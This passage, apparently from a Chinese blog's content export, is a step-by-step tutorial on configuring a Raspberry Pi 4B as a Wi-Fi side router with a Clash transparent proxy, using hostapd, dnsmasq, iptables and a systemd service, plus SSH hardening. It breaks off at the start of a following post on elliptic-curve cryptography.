OS默认关闭了ssh登录。解决方法是：在烧录SD卡成功后，手工mount并在根目录下touch一个空文件，名称是ssh</p>\n</blockquote>\n<p>树莓派首次启动时，默认采用DHCP方式获取IP地址，在接入路由器上找到相应IP地址，通过ssh远程登录。<br>默认帐号：Username: pi Password: raspberry<br>当然，如果连接了显示器和键盘，就不需要处理ssh登录的问题了。</p>\n<h3 id=\"二、设置树莓派的运行环境\"><a href=\"#二、设置树莓派的运行环境\" class=\"headerlink\" title=\"二、设置树莓派的运行环境\"></a>二、设置树莓派的运行环境</h3><ol>\n<li><p>设置网络参数，并重新启动</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 激活无线网卡</span></span><br><span class=\"line\">sudo rfkill unblock wlan</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置两张网卡的网络参数</span></span><br><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/network/interfaces &gt; /dev/null &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">auto lo</span></span><br><span class=\"line\"><span class=\"string\">iface lo inet loopback</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">auto eth0</span></span><br><span class=\"line\"><span class=\"string\">iface eth0 inet static</span></span><br><span class=\"line\"><span class=\"string\">address 192.168.0.8</span></span><br><span class=\"line\"><span class=\"string\">netmask 255.255.255.0</span></span><br><span class=\"line\"><span class=\"string\">gateway 192.168.0.1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">allow-hotplug wlan0</span></span><br><span class=\"line\"><span class=\"string\">iface wlan0 inet static</span></span><br><span class=\"line\"><span class=\"string\">address 192.168.11.1</span></span><br><span class=\"line\"><span class=\"string\">netmask 255.255.255.0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p> 网络参数设置成功后，使用<code>sudo reboot</code>重启树莓派。<br> 以<code>ssh pi@192.168.0.8</code>从新的IP地址登录，并使用<code>ip a</code>检查网络情况，如果获得以下输出就OK了！</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/ether dc:a6:32:ad:ad:78 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.0.8/24 brd 192.168.0.255 scope global eth0</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::dea6:32ff:fead:ad78/64 scope <span class=\"built_in\">link</span></span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/ether dc:a6:32:ad:ad:79 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.11.1/24 brd 192.168.11.255 scope global wlan0</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置软件源，并安装基础软件</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭默认源</span></span><br><span class=\"line\">sudo sed -i <span class=\"string\">&#x27;s/^deb http/#deb http/g&#x27;</span> /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置Aliyun国内源</span></span><br><span class=\"line\">sudo sh -c <span class=\"string\">&#x27;echo &quot;deb https://mirrors.aliyun.com/raspbian/raspbian/ buster main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list&#x27;</span></span><br><span class=\"line\">sudo sh -c <span class=\"string\">&#x27;echo &quot;deb-src https://mirrors.aliyun.com/raspbian/raspbian/ buster main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新源仓库，并安装基础软件</span></span><br><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install net-tools dnsutils ntp hostapd git iptables-persistent netfilter-persistent dnsmasq -y</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>基础软件安装都在此步骤完成！！！ 因为后续启动Clash内建DNS，将域名解析到伪地址，会影响本机Terminal的外网访问</li>\n</ul>\n</blockquote>\n</li>\n<li><p>关闭不需要的Systemd自启动服务</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭avahi自动网络发现功能，类似Bonjure</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">disable</span> avahi-daemon</span><br><span class=\"line\">sudo systemctl stop avahi-daemon</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 暂时关闭dnsmasq服务，避免影响Clash安装</span></span><br><span class=\"line\">sudo systemctl stop dnsmasq</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>dsnmasq安装时会自动修改&#x2F;etc&#x2F;resolv.conf，将默认DNS修改为127.0.0.1</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"三、安装并设置Clash\"><a href=\"#三、安装并设置Clash\" class=\"headerlink\" title=\"三、安装并设置Clash\"></a>三、安装并设置Clash</h3><p>Clash的Github地址是<a href=\"https://github.com/Dreamacro/clash\">https://github.com/Dreamacro/clash</a>, 技术文档位于<a href=\"https://lancellc.gitbook.io/clash/clash-config-file/an-example-configuration-file\">https://lancellc.gitbook.io/clash</a></p>\n<p>基于众所周知的原因，建议采用手工下载并通过sftp传入树莓派，主要包括以下文件：</p>\n<table>\n<thead>\n<tr>\n<th>文件名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>clash-linux-armv7-v1.0.0.gz</td>\n<td>clash的可执行文件</td>\n</tr>\n<tr>\n<td>Country.mmdb</td>\n<td>各个国家的IP地址数据文件, clash启动时会自动下载</td>\n</tr>\n<tr>\n<td>yacd-gh-pages.zip</td>\n<td>第三方控制面板插件，比官方的好看一些</td>\n</tr>\n<tr>\n<td>config.yaml</td>\n<td>VPS客户端的配置文件</td>\n</tr>\n</tbody></table>\n<ol>\n<li><p>传入文件默认存放在<code>/home/pi/</code>，解压并手工安装</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 建立clash的home目录</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> <span class=\"variable\">$HOME</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> .config</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> .config/clash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置/usr/bin/clash，并添加绑定低位端口的权限</span></span><br><span class=\"line\">sudo gunzip clash-linux-armv7-v1.0.0.gz</span><br><span class=\"line\"></span><br><span class=\"line\">sudo <span class=\"built_in\">mv</span> clash-linux-armv7-v1.0.0 /usr/bin/clash</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> a+x /usr/bin/clash</span><br><span class=\"line\">sudo <span class=\"built_in\">setcap</span> cap_net_bind_service=+ep /usr/bin/clash</span><br><span class=\"line\"><span class=\"built_in\">ls</span> -l /usr/bin/clash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装配置文件</span></span><br><span class=\"line\">unzip yacd-gh-pages.zip</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> yacd-gh-pages /home/pi/.config/clash/yacd-dashboard</span><br><span class=\"line\"><span class=\"built_in\">mv</span> Country.mmdb /home/pi/.config/clash/</span><br><span class=\"line\"><span class=\"built_in\">mv</span> config.yaml /home/pi/.config/clash/</span><br><span class=\"line\"><span class=\"built_in\">ls</span> -l /home/pi/.config/clash/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入<code>sudo clash -d /home/pi/.config/clash</code>，启动clash</p>\n<p> 正常情况下屏幕将显示如下内容，就表示启动成功并打开了相应的侦听端口</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~/.config/clash $ sudo clash -d /home/pi/.config/clash</span><br><span class=\"line\">INFO[0000] Start initial compatible provider auto</span><br><span class=\"line\">INFO[0000] Start initial compatible provider Proxy</span><br><span class=\"line\">INFO[0000] HTTP proxy listening at: :7890</span><br><span class=\"line\">INFO[0000] SOCKS proxy listening at: :7891</span><br><span class=\"line\">INFO[0000] DNS server listening at: 0.0.0.0:53</span><br><span class=\"line\">INFO[0000] Redir proxy listening at: :7892</span><br><span class=\"line\">INFO[0000] RESTful API listening at: 0.0.0.0:9090</span><br></pre></td></tr></table></figure>\n\n<p> 也可以自行检查端口占用情况</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ sudo netstat -tunpl |grep clash</span><br><span class=\"line\">tcp6       0      0 :::7890                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">tcp6       0      0 :::7891                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">tcp6       0      0 :::7892                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">tcp6       0      0 :::9090                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">udp6       0      0 :::53                   :::*                                3001/clash</span><br><span class=\"line\">udp6       0      0 :::7891                 :::*                                3001/clash</span><br><span class=\"line\">udp6       0      0 :::7892                 :::*                                3001/clash  </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>vmess等协议对Server和CLient的时钟同步有严格要求，如果没有NTP服务，可能导致无法连通</p>\n</blockquote>\n</li>\n<li><p>输入<code>curl -x http://localhost:7890 google.com</code>, 检查KX上网的效果</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ curl -x http://localhost:7890 google.com</span><br><span class=\"line\">&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class=\"line\">&lt;TITLE&gt;301 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;</span><br><span class=\"line\">&lt;H1&gt;301 Moved&lt;/H1&gt;</span><br><span class=\"line\">The document has moved</span><br><span class=\"line\">&lt;A HREF=&quot;http://www.google.com/&quot;&gt;here&lt;/A&gt;.</span><br><span class=\"line\">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>浏览器输入地址<code>http://192.168.0.8:9090/ui</code>，打开控制面板</p>\n</li>\n</ol>\n<img src=\"/2020/07/21/%E5%9F%BA%E4%BA%8E%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%9E%84%E5%BB%BA%E6%94%AF%E6%8C%81%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E7%9A%84%E8%BE%85%E5%8A%A9%E8%B7%AF%E7%94%B1%E5%99%A8/dashboard-1.png\" class=\"\">\n\n<h3 id=\"四、配置并启动AP热点\"><a href=\"#四、配置并启动AP热点\" class=\"headerlink\" title=\"四、配置并启动AP热点\"></a>四、配置并启动AP热点</h3><ol>\n<li><p>输入<code>sudo vi /etc/dnsmasq.conf</code>， 也可以根据本次环境自行修改网络参数</p>\n<blockquote>\n<p>注意：dnsmasq仅作为DHCP服务器，不启动DNS，因为Clash有自建的DNS</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># DHCP</span><br><span class=\"line\">interface=wlan0</span><br><span class=\"line\">listen-address=192.168.11.1</span><br><span class=\"line\">dhcp-range=192.168.11.100, 192.168.11.150, 12h</span><br><span class=\"line\"></span><br><span class=\"line\"># set default route</span><br><span class=\"line\">dhcp-option=3,192.168.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"># set default nameserver</span><br><span class=\"line\">dhcp-option=6, 192.168.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"># without DNS</span><br><span class=\"line\">port=0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入<code>sudo vi /etc/default/hostapd</code>, 设置hostapd启动配置文件。<br> 将其中包含<code>#DAEMON_CONF=&quot;&quot;</code>的行，修改为</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入<code>sudo vi /etc/hostapd/hostapd.conf</code>， 根据本地网络环境自行修改配置AP接入参数</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface=wlan0</span><br><span class=\"line\">driver=nl80211</span><br><span class=\"line\">hw_mode=g</span><br><span class=\"line\">ssid=&lt; Your SSID &gt;</span><br><span class=\"line\">channel=6</span><br><span class=\"line\">wpa=2</span><br><span class=\"line\">wpa_passphrase=&lt; Your Passeword &gt;</span><br><span class=\"line\">wpa_key_mgmt=WPA-PSK</span><br><span class=\"line\">wpa_pairwise=CCMP</span><br><span class=\"line\">rsn_pairwise=CCMP</span><br><span class=\"line\">auth_algs=3</span><br><span class=\"line\">wmm_enabled=1</span><br><span class=\"line\">max_num_sta=10</span><br><span class=\"line\">logger_stdout=-1</span><br><span class=\"line\">logger_stdout_level=2</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：将<code>&lt; Your SSID &gt;</code> 和 <code>&lt; Your Passeword &gt;</code> 修改为用户定义数据</p>\n</blockquote>\n</li>\n<li><p>通过systemd，启动AP热点</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># hostapd启动解锁</span></span><br><span class=\"line\">sudo systemctl unmask hostapd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重启服务</span></span><br><span class=\"line\">sudo systemctl restart hostapd</span><br><span class=\"line\">sudo systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>\n\n<p> 启动完成后，另外找一台PC设备，寻找SSID并连接登录，此时应该分配一个<code>198.168.11.x</code>的地址。<br> 检查该PC的网络参数，默认路由是<code>192.168.11.1</code>，DNS设置为<code>198.19.0.1</code>，但是并不能上网(DNS是个fake-ip的假地址)，因为下面还有一个关键步骤。</p>\n</li>\n</ol>\n<h3 id=\"五、为从路由器设置透明代理\"><a href=\"#五、为从路由器设置透明代理\" class=\"headerlink\" title=\"五、为从路由器设置透明代理\"></a>五、为从路由器设置透明代理</h3><ol>\n<li><p>为AP热点设置动态NAT转发，只出不进</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 为 wlan0---&gt;eth0 设置动态NAT出口转换</span></span><br><span class=\"line\">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  </span><br><span class=\"line\">sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT  </span><br><span class=\"line\">sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>为Clash设置全量数据转发</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建两条链，clash用于数据访问，clash_dns用于内建DNS</span></span><br><span class=\"line\">sudo iptables -t nat -N clash</span><br><span class=\"line\">sudo iptables -t nat -N clash_dns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为内建DNS设置NAT转换，从198.18.0.1---&gt;198.19.x.x，同时支持UDP和TCP，但当前版本实际只使用UDP</span></span><br><span class=\"line\"><span class=\"comment\"># 重要：192.168.0.8是你的Clash出口地址，应根据网络环境自行修改！！！</span></span><br><span class=\"line\">sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -d 198.19.0.0/24 -j clash_dns</span><br><span class=\"line\">sudo iptables -t nat -A PREROUTING -p udp --dport 53 -d 198.19.0.0/24 -j clash_dns</span><br><span class=\"line\">sudo iptables -t nat -A clash_dns -p udp --dport 53 -d 198.19.0.0/24 -j DNAT --to-destination 192.168.0.8:53</span><br><span class=\"line\">sudo iptables -t nat -A clash_dns -p tcp --dport 53 -d 198.19.0.0/24 -j DNAT --to-destination 192.168.0.8:53</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为Clash数据访问建立NAT转换</span></span><br><span class=\"line\">sudo iptables -t nat -A PREROUTING -p tcp -j clash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为本机网段、私有网段、保留网段等提供直通车</span></span><br><span class=\"line\">sudo iptables -t nat -A clash -d 0.0.0.0/8 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 10.0.0.0/8 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 127.0.0.0/8 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 169.254.0.0/16 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 172.16.0.0/12 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 192.168.0.0/16 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 224.0.0.0/4 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 240.0.0.0/4 -j RETURN</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 上述条件之外的数据流量，一律转发给7892端口，实现免代理的透明网关</span></span><br><span class=\"line\">sudo iptables -t nat -A clash -p tcp -j REDIRECT --to-ports 7892</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置iptables路由表的持久化</p>\n<p> 执行完上面的 iptables 命令之后，就完成了旁路由的路由功能了，但是此时 iptables 并没有永久保存，下次开机上面的配置就会丢失。<br> 为了使得重启之后 iptables 命令仍然存在，我们需要安装<code>iptables-persistent软件</code>来实现(前面步骤二已完成)：<br> 执行以下命令，就即可将最新的 iptables 规则保存下来。</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># sudo apt install iptables-persistent</span></span><br><span class=\"line\">sudo sh -c <span class=\"string\">&#x27;iptables-save &gt; /etc/iptables/rules.v4&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>安装的过程中会提示你是否需要保存 iptables 配置，直接选是就行。这时候即使电脑重启了也会应用这些路由规则。</p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"六、设置Clash开机自启动\"><a href=\"#六、设置Clash开机自启动\" class=\"headerlink\" title=\"六、设置Clash开机自启动\"></a>六、设置Clash开机自启动</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/systemd/system/clash.service &gt; /dev/null &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[Unit]</span></span><br><span class=\"line\"><span class=\"string\">Description=clash service</span></span><br><span class=\"line\"><span class=\"string\">After=network.target</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Service]</span></span><br><span class=\"line\"><span class=\"string\">Type=simple</span></span><br><span class=\"line\"><span class=\"string\">User=pi</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"># Set port permissions capability without root user</span></span><br><span class=\"line\"><span class=\"string\">CapabilityBoundingSet=CAP_NET_BIND_SERVICE</span></span><br><span class=\"line\"><span class=\"string\">AmbientCapabilities=CAP_NET_BIND_SERVICE</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">ExecStart=/usr/bin/clash -d /home/pi/.config/clash</span></span><br><span class=\"line\"><span class=\"string\">Restart=on-failure # or always, on-abort, etc</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Install]</span></span><br><span class=\"line\"><span class=\"string\">WantedBy=multi-user.target</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> clash</span><br></pre></td></tr></table></figure>\n\n<p>到此为止，Clash透明网关就算是大功告成了，现在可以重启树莓派，检查科学成果了！！！</p>\n<p>当然，从系统安全的角度，做一些扫尾的工作也很重要，包括：</p>\n<ul>\n<li>编辑树莓派的公匙文件<code>mkdir $HOME/.ssh &amp;&amp; vi $HOME/.ssh/authorized_keys</code>，将各台需要管理PC的 RSA 公匙加入</li>\n<li>在树莓派上，设置文件权限并重启ssh服务</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">chmod</span> 600 <span class=\"variable\">$HOME</span>/.ssh/authorized_keys</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> 700 <span class=\"variable\">$HOME</span>/.ssh/</span><br><span class=\"line\"></span><br><span class=\"line\">sudo systemctl restart sshd</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在管理PC上，尝试ssh登录，如果免密码成功，就可以关闭口令登录了</li>\n<li>编辑树莓派的<code>sudo vi /etc/ssh/sshd_config</code>，将<code>PasswordAuthentication</code>设为<code>no</code>，以禁止采用口令登录</li>\n</ul>\n<p>这样一来，树莓派就在指定PC上就可以<code>pi</code>用户实现免密码登录，而其它用户、其它PC都无法登录了</p>\n<h2 id=\"Clash透明网关的使用方法\"><a href=\"#Clash透明网关的使用方法\" class=\"headerlink\" title=\"Clash透明网关的使用方法\"></a>Clash透明网关的使用方法</h2><p>首先找到相应SSID，连接AP热点后自动设置默认网关和DNS，浏览器打开直接上网，再也不用 HTTP 或 SOCK5 代理了。<br>如果想要观察Clash运行情况，可以在浏览器打开<a href=\"http://192.168.0.8:9090/ui]\">http://192.168.0.8:9090/ui</a></p>\n<p>Clash的配置是一件比较复杂的工作，准备下次专门讨论，这里就不啰嗦了。</p>\n<hr>\n<h2 id=\"补充问题\"><a href=\"#补充问题\" class=\"headerlink\" title=\"补充问题\"></a>补充问题</h2><h3 id=\"附录1-Clash的Home目录结构\"><a href=\"#附录1-Clash的Home目录结构\" class=\"headerlink\" title=\"附录1: Clash的Home目录结构\"></a>附录1: Clash的Home目录结构</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ tree <span class=\"variable\">$HOME</span>/.config/clash/</span><br><span class=\"line\">/home/pi/.config/clash/</span><br><span class=\"line\">├── config.yaml</span><br><span class=\"line\">├── Country.mmdb</span><br><span class=\"line\">└── uacd-dashboard</span><br><span class=\"line\">    ├── 9.e5ebc45c57147750a8b7.js</span><br><span class=\"line\">    ├── app.2710ac87312332833aa4.js</span><br><span class=\"line\">    ├── app.2710ac87312332833aa4.js.LICENSE.txt</span><br><span class=\"line\">    ├── app.bb773b8bdd4263de9ffd.css</span><br><span class=\"line\">    ├── CNAME</span><br><span class=\"line\">    ├── core-js~app.4e0935a458133ffa9ca3.js</span><br><span class=\"line\">    ├── _headers</span><br><span class=\"line\">    ├── index.html</span><br><span class=\"line\">    ├── open-sans-latin-400.woff2</span><br><span class=\"line\">    ├── open-sans-latin-700.woff2</span><br><span class=\"line\">    ├── proxies.1e31d885e6fe278da534.css</span><br><span class=\"line\">    ├── proxies.beaddeef3e0db08db953.js</span><br><span class=\"line\">    ├── react~app.10618449a8e9b56a1845.js</span><br><span class=\"line\">    ├── react~app.10618449a8e9b56a1845.js.LICENSE.txt</span><br><span class=\"line\">    ├── report.html</span><br><span class=\"line\">    ├── roboto-mono-latin-400.woff2</span><br><span class=\"line\">    ├── rules.3ba17dd53c9d8bd8b221.css</span><br><span class=\"line\">    ├── rules.90faad053acc32c74a88.js</span><br><span class=\"line\">    ├── runtime.30479c2b09f71505cee3.js</span><br><span class=\"line\">    ├── vendors~chartjs.e4543f10556636d64b75.js</span><br><span class=\"line\">    ├── vendors~chartjs.e4543f10556636d64b75.js.LICENSE.txt</span><br><span class=\"line\">    ├── vendors~proxies.34b4cb2526b2e8ed766c.js</span><br><span class=\"line\">    ├── vendors~rules.b2e93c21da80f9dc4a80.js</span><br><span class=\"line\">    ├── yacd-128.png</span><br><span class=\"line\">    ├── yacd-64.png</span><br><span class=\"line\">    └── yacd.ico</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"附录2：关于avahi服务\"><a href=\"#附录2：关于avahi服务\" class=\"headerlink\" title=\"附录2：关于avahi服务\"></a>附录2：关于avahi服务</h3><p><code>Zeroconf</code>（Zero configuration networking）零配置网络服务规范，是一种用于自动生成可用IP地址的网络技术，不需要额外的手动配置和专属的配置服务器。</p>\n<p>Zeroconf规范的提出者是Apple公司，目标是让非专业用户也能便捷的连接各种网络设备，例如计算机，打印机等。整个搭建网络的过程都是通过程式自动化实现。如果没有 zeroconf，用户必须手动配置一些服务，例如DHCP、DNS，计算机网络的其他设置等。这些对非技术用户和新用户们来说是很难的事情。</p>\n<p><code>Avahi</code> 是Zeroconf规范的开源实现，常见使用在Linux上。包含了一整套多播DNS(multicastDNS)&#x2F;DNS-SD网络服务的实现。它使用 的发布授权是LGPL。Zeroconf规范的另一个实现是Apple公司的Bonjour程式。<code>Avahi</code>和<code>Bonjour</code>相互兼容(废话，都走同一个 规范标准嘛，就象IE，Firefox，chrome都能跑HTTP1.1一样)。</p>\n<p><code>Avahi</code>允许程序在不需要进行手动网络配置的情况 下，在一个本地网络中发布和获知各种服务和主机。例如，当某用户把他的计算机接入到某个局域网时，如果他的机器运行有Avahi服务，则Avahi程式自 动广播，从而发现网络中可用的打印机、共享文件和可相互聊天的其他用户。这有点象他正在接收局域网中的各种网络广告一样。</p>\n<p>Linux下系统实际启动的进程名，是<code>avahi-daemon</code>。除非你有兼容的设备或使用 zeroconf 协议的服务，否则应该关闭它。</p>\n<h2 id=\"参考目录\"><a href=\"#参考目录\" class=\"headerlink\" title=\"参考目录\"></a>参考目录</h2><p>核心参考文献</p>\n<ul>\n<li><a href=\"https://cherysunzhang.com/2020/05/deploy-clash-as-transparent-proxy-on-raspberry-pi/\">在 Raspberry Pi上运行Clash作为透明代理</a></li>\n<li><a href=\"https://blog.nicesite.win/2017/08/16/soft-router/\">在树莓派上搭建软路由</a></li>\n<li><a href=\"https://blog.serenader.me/shi-yong-pve-yun-xing-clash-pang-lu-you-xu-ni-ji-shi-xian-tou-ming-dai-li\">使用PVE运行Clash旁路由虚拟机实现透明代理</a></li>\n<li><a href=\"https://www.joxrays.com/raspberry-wifi-router/\">树莓派搭建简略WiFi无线路由器</a></li>\n<li><a href=\"https://blog.serenader.me/shi-yong-pve-yun-xing-clash-pang-lu-you-xu-ni-ji-shi-xian-tou-ming-dai-li\">使用 PVE 运行 Clash 旁路由虚拟机实现透明代理</a></li>\n<li><a href=\"https://breakertt.moe/2019/08/20/clash_gateway/index.html\">Ubuntu18.04 上使用 clash 部署旁路代理网关</a></li>\n</ul>\n<p>关于网络协议</p>\n<ul>\n<li><a href=\"https://www.zsythink.net/archives/1199\">iptables经典教材</a></li>\n<li><a href=\"https://lesca.me/archives/iptables-nat-mangle-clear-rules.html\">iptables的命令解释</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E4%BF%9D%E7%95%99IP%E5%9C%B0%E5%9D%80\">IPv4的保留IP地址定义</a></li>\n<li><a href=\"http://www.enkichen.com/2017/05/23/dnsmasq-introduce/\">Dnsmasq配置文件详解</a></li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/linux/l-wifiencrypthostapd/index.html\">Hostapd配置文件详解</a></li>\n</ul>\n<p>关于Clash</p>\n<ul>\n<li><a href=\"https://github.com/Dreamacro/clash\">Clash的Github官方网站</a></li>\n<li><a href=\"https://lancellc.gitbook.io/clash/clash-config-file/dns\">Clash的Gitbook官方文档</a></li>\n<li><a href=\"https://tlanyan.me/v2ray-clients-download/\">V2ray的主流客户端</a></li>\n<li><a href=\"https://blog.skk.moe/post/alternate-surge-koolclash-as-gateway/#redir-host-%E7%9A%84%E9%97%AE%E9%A2%98\">关于Clash自带DNS服务器的fake-ip模式</a></li>\n<li><a href=\"https://www.v2rayssr.com/clashxx.html\">Clash的配置文件示例</a></li>\n<li><a href=\"https://lancellc.gitbook.io/clash/clash-config-file/an-example-configuration-file\">Clash的配置文件示例2</a></li>\n</ul>\n"},{"title":"基于椭圆曲线的ECC非对称密码系统","url":"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>ECC（椭圆曲线密码学，Elliptic Curve 